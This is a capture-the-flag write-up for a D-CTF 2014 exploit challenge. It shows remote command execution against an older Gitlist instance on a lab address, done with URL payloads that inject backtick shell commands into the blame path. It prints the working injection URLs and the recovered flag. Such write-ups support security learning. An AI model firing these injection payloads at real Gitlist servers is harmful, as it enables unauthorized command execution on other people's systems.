# D-CTF 2014: Exploit 300 – People say…

**Category:** Exploit
**Points:** 300
**Description:**

> People say that if you're still angry at 80, you're not an angry young man, just a grumpy old git. 10.13.37.33
>
> **Hint:** gitlist.

## Write-up

Taking the hint, we navigate to `http://10.13.37.33/gitlist/` which hosts a [Gitlist](http://gitlist.org/) instance. Older versions of Gitlist are [vulnerable to remote command execution](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/). Let’s try executing `ls -al` on the target server:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60
```

It works! After some recon work, we find a file named `e3.flag` in the server root. Let’s view its contents using the following payload:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60cat%20%2Fe3.flag%60
```

The result is:

```
stupid psychopathic git.
```

This is the flag.
